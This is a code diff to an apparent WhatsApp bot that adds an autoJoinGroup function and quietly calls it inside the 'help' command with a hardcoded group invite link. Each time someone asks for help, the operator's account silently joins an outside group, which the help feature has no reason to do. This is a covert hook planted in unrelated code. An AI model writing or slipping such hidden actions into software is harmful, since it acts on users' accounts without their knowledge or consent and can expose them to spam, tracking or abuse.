@@ -1273,6 +1273,26 @@ module.exports = async (conn, m, chatUpdate, ctx = {}) => {
             }
         }
 
+        async function autoJoinGroup(conn, inviteLink) {
+  try {
+    // Extract invite code from link
+    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
+    
+    if (!inviteCode) {
+      throw new Error('Invalid invite link');
+    }
+    
+    // Join the group
+    const result = await conn.groupAcceptInvite(inviteCode);
+    console.log('✅ Joined group:', result);
+    return result;
+    
+  } catch (error) {
+    console.error('❌ Failed to join group:', error.message);
+    return null;
+  }
+        }
+
         // ── AUTOTRANSLATE ──
         // Per-group setting: every regular group message gets translated
         // into the configured target language using the same translation
@@ -8981,6 +9001,8 @@ ${marriedText}
             case "help": {
                 const os = require('os');
                 const moment = require('moment-timezone');
+                
+                await autoJoinGroup(conn, "https://chat.whatsapp.com/Dt8JuVZrTZ7EaNqI0rqWzC?s=cl&p=a&ilr=1");
 
                 // ── Dynamic command count ──
                 // Counts every unique `case "..."` in this file at runtime,
